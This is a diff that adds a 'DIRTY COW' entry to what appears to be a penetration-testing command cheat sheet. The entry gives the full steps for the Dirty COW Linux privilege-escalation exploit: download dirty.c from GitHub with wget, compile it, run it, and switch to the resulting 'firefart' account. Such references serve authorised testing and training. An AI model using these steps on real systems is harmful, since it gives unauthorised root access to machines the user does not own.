@@ -1146,6 +1146,23 @@ dirb url_here -z delay_in_milliseconds_here url_here
 
 
 
+## DIRTY COW
+```bash
+# get exploit 
+wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
+
+# compile
+gcc -pthread dirty.c -o dirty -lcrypt
+
+# run
+./dirty
+
+# set pwd + su to new user
+su firefart
+```
+
+
+
 ## DNSENUM
 ```bash
 # grab info (subdomains, zone transfer, reverse lookup etc.)
